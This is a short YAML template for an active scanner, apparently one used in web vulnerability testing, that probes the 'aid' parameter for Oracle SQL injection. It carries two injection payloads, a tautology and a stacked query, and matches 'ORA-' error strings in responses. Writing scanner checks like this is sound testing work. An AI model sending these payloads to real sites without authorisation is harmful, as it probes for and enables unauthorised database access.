id: sqli3-oracle-04
name: 'SQLi oracle prefix #3 in aid'
severity: high
type: active
tags:
  - sqli
  - injection
  - oracle
description: 'Triggers oracle error via aid'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      aid:
        - '1'' OR ''1''=''1'' /*'
        - '1''; SELECT 1--'
    matchers:
      - type: regex
        part: body
        regex:
          - 'ORA-'
          - 'Oracle error'
